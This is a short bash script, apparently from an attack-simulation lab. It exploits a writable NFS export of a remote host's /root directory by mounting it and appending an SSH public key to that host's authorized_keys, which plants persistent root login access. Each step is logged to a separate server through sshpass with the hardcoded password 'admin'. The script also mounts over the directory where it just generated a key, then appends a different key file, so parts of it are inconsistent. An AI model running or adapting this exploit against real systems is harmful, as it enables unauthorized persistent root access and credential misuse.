#!/bin/bash
# logging
log_path="/home/ubuntu/attack_logs/common_exploits.log"
log_server="10.10.2.74"
# Create a directory for the mount point
mkdir /tmp/sshkey
echo "$(date +'%Y-%m-%d %H:%M:%S.%N') exploit NFS: Create a directory for the mount point" | sshpass -p "admin" ssh ubuntu@$log_server "cat >> $log_path"

# Generate an SSH key pair
ssh-keygen -t rsa -b 4096 -N "" -f /tmp/sshkey/id_rsa
echo "$(date +'%Y-%m-%d %H:%M:%S.%N') exploit NFS: Generate an SSH key pair" | sshpass -p "admin" ssh ubuntu@$log_server "cat >> $log_path"


# Mount the NFS share
mount -t nfs 10.10.2.253:/root/ /tmp/sshkey
echo "$(date +'%Y-%m-%d %H:%M:%S.%N') exploit NFS: Mount the NFS share" | sshpass -p "admin" ssh ubuntu@$log_server "cat >> $log_path"


# Append the public key to the authorized_keys file on the remote server
cat /root/.ssh/id_rsa.pub >> /tmp/sshkey/.ssh/authorized_keys
echo "$(date +'%Y-%m-%d %H:%M:%S.%N') exploit NFS: Append the public key to the authorized_keys file on the remote server" | sshpass -p "admin" ssh ubuntu@$log_server "cat >> $log_path"


# unmount the dir
umount -f /tmp/sshkey
echo "$(date +'%Y-%m-%d %H:%M:%S.%N') exploit NFS: unmount the dir" | sshpass -p "admin" ssh ubuntu@$log_server "cat >> $log_path"
